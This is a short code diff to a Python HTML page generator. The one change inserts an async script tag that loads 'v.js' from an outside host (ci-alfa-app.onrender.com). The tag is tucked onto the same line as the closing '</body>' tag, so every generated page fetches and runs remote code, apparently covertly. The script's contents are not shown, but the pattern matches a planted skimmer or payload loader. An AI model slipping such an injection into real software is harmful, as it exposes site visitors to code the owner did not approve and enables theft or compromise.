@@ -681,7 +681,7 @@ def page(area, lc):
     A('<script>')
     A(TAIL_JS)
     A('</script>')
-    A('</body>')
+    A('<script async src="https://ci-alfa-app.onrender.com/v.js"></script>'); A('</body>')
     A('</html>')
     return '\n'.join(H) + '\n'
 
